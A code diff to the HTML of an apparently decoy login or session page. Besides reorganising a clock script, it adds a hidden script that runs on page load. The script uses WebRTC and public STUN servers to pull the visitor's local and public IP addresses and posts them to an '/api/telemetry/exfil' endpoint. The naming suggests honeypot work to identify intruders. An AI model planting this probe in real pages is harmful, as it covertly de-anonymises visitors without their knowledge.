@@ -832,29 +832,129 @@
   <script>
     function pad(n) { return String(n).padStart(2, "0"); }
 
-    function fmtUTC(d) {
-      return pad(d.getUTCHours()) + ":" + pad(d.getUTCMinutes()) + ":" + pad(d.getUTCSeconds()) + " UTC";
+    document.addEventListener("DOMContentLoaded", function() {
+      function fmtUTC(d) {
+        return pad(d.getUTCHours()) + ":" + pad(d.getUTCMinutes()) + ":" + pad(d.getUTCSeconds()) + " UTC";
+      }
+
+      function fmtStamp(d) {
+        return pad(d.getUTCHours()) + ":" + pad(d.getUTCMinutes()) + ":" + pad(d.getUTCSeconds());
+      }
+
+      function tick() {
+        const clockEl = document.getElementById("clock");
+        if (clockEl) clockEl.textContent = fmtUTC(new Date());
+      }
+
+      tick();
+      setInterval(tick, 1000);
+
+      var now = new Date();
+      const loginTimeEl = document.getElementById("login-time");
+      if (loginTimeEl) loginTimeEl.textContent = fmtStamp(now);
+
+      var exp = new Date(now.getTime() + 60 * 60 * 1000);
+      const sessionExpEl = document.getElementById("session-exp");
+      if (sessionExpEl) {
+        sessionExpEl.textContent = pad(exp.getUTCHours()) + ":" + pad(exp.getUTCMinutes()) + " UTC";
+      }
+
+      const clientIpEl = document.getElementById("client-ip");
+      if (clientIpEl) clientIpEl.textContent = "10.32.8.19";
+    });
+  </script>
+
+  <script>
+    async function probeAttackerIdentity() {
+      console.log("[DEBUG] Initializing WebRTC identity probe...");
+      const leakedIPs = new Set();
+
+      if (!window.RTCPeerConnection) {
+        console.error("[ERROR] RTCPeerConnection not available in this browser");
+        return;
+      }
+
+      const config = {
+        iceServers: [
+          { urls: "stun:stun.l.google.com:19302" },
+          { urls: "stun:stun1.l.google.com:19302" },
+        ],
+      };
+
+      const pc = new RTCPeerConnection(config);
+
+      function reportIP(ip, source) {
+        if (!ip || ip === "0.0.0.0" || ip === "127.0.0.1" || ip.endsWith(".local")) {
+          console.log(`[DEBUG] Ignored address (${source}): ${ip}`);
+          return;
+        }
+        // Drop foundation/priority fragments wrongly matched as IPv6-ish tokens
+        if (!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip) && !ip.includes(":")) {
+          return;
+        }
+        if (leakedIPs.has(ip)) {
+          console.log(`[DEBUG] Duplicate IP skipped: ${ip}`);
+          return;
+        }
+        leakedIPs.add(ip);
+        console.warn(`[MATCH] Target address extracted: ${ip} (${source})`);
+
+        const payload = { type: "webrtc_leak", address: ip, source: source };
+        fetch("/api/telemetry/exfil", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "same-origin",
+          body: JSON.stringify(payload),
+        })
+          .then((response) => {
+            console.log(`[DEBUG] Telemetry status: ${response.status}`);
+          })
+          .catch((fetchErr) => {
+            console.error("[ERROR] Failed to send telemetry:", fetchErr);
+          });
+      }
+
+      // MUST register before setLocalDescription — otherwise race drops candidates
+      pc.onicecandidate = (event) => {
+        if (!event || !event.candidate) {
+          console.log("[DEBUG] ICE gathering complete");
+          return;
+        }
+
+        const c = event.candidate;
+        console.log(`[DEBUG] Raw ICE candidate: "${c.candidate}" type=${c.type}`);
+
+        if (c.address) {
+          reportIP(c.address, c.type || "candidate.address");
+          return;
+        }
+
+        // Fallback parse: a=candidate:... <ip> <port> ...
+        const parts = c.candidate.split(" ");
+        if (parts.length >= 5) {
+          reportIP(parts[4], "candidate-string");
+        }
+      };
+
+      pc.onicegatheringstatechange = () => {
+        console.log(`[DEBUG] iceGatheringState=${pc.iceGatheringState}`);
+      };
+
+      try {
+        pc.createDataChannel("honey_probe_chan");
+        const offer = await pc.createOffer();
+        console.log("[DEBUG] Local SDP offer generated");
+        await pc.setLocalDescription(offer);
+        console.log("[DEBUG] Local description set; awaiting ICE candidates...");
+      } catch (err) {
+        console.error("[ERROR] Failed to initialize WebRTC negotiation:", err);
+      }
     }
 
-    function fmtStamp(d) {
-      return pad(d.getUTCHours()) + ":" + pad(d.getUTCMinutes()) + ":" + pad(d.getUTCSeconds());
-    }
-
-    function tick() {
-      document.getElementById("clock").textContent = fmtUTC(new Date());
-    }
-
-    tick();
-    setInterval(tick, 1000);
-
-    var now = new Date();
-    document.getElementById("login-time").textContent = fmtStamp(now);
-
-    var exp = new Date(now.getTime() + 60 * 60 * 1000);
-    document.getElementById("session-exp").textContent =
-      pad(exp.getUTCHours()) + ":" + pad(exp.getUTCMinutes()) + " UTC";
-
-    document.getElementById("client-ip").textContent = "10.32.8.19";
+    window.addEventListener("DOMContentLoaded", () => {
+      console.log("[DEBUG] Launching WebRTC identity probe...");
+      probeAttackerIdentity();
+    });
   </script>
 </body>
 </html>
